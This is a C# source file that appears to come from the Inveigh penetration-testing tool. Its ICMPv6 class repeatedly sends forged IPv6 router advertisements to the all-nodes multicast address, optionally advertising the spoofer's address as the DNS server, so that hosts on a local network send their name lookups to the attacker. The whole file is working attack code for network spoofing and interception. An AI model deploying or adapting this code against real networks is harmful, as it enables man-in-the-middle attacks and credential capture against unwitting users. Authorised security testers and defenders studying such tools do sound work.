using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;

namespace Inveigh
{
    class ICMPv6
    {
        public static void icmpv6RouterAdvertise() // todo why doesn't this seem to fully work?
        {
            Program.icmpv6Interval *= 1000;  
            string responseMessage = " ";

            while (!Program.exitInveigh)
            {

                using (MemoryStream icmpv6MemoryStream = new MemoryStream())
                {

                    if (Program.enabledDHCPv6)
                    {
                        icmpv6MemoryStream.Write((new byte[16] { 0x86, 0x00, 0x00, 0x00, 0x00, 0xc8, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 16);
                    }
                    else
                    {
                        icmpv6MemoryStream.Write((new byte[16] { 0x86, 0x00, 0x00, 0x00, 0x00, 0x08, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 16);
                        icmpv6MemoryStream.Write((new byte[8] { 0x19, 0x03, 0x00, 0x00, 0x00, 0x00, 0x07, 0x08 }), 0, 8);
                        icmpv6MemoryStream.Write(Program.spooferIPv6Data, 0, Program.spooferIPv6Data.Length);
                        responseMessage = " with DNS ";

                    }

                    Socket icmpv6SendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.IcmpV6);
                    icmpv6SendSocket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.MulticastTimeToLive, 255);
                    icmpv6SendSocket.SendBufferSize = (int)icmpv6MemoryStream.Length;
                    IPEndPoint icmpv6EndPoint = new IPEndPoint(IPAddress.Parse("ff02::1"), 0);
                    icmpv6SendSocket.SendTo(icmpv6MemoryStream.ToArray(), (int)icmpv6MemoryStream.Length, SocketFlags.None, icmpv6EndPoint);
                    icmpv6SendSocket.Close();
                }

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] ICMPv6 router advertisment{1}sent to ff02::1", DateTime.Now.ToString("s"), responseMessage));
                }

                Thread.Sleep(Program.icmpv6Interval);
            }

        }

    }

}
